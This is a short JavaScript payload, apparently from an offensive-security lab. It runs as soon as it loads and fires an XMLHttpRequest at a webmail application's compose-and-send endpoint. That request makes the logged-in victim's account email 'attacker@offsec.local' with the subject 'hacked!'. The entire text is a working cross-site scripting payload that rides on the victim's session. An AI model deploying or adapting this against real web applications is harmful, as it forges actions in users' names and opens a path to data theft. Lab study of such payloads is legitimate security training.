var email = "attacker@offsec.local";
var subject = "hacked!";
var message = "This is a test email!";
function send_email()
{
var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;
xhr = new XMLHttpRequest();
xhr.open("GET", uri + query_string, true);
xhr.send(null);
}
send_email();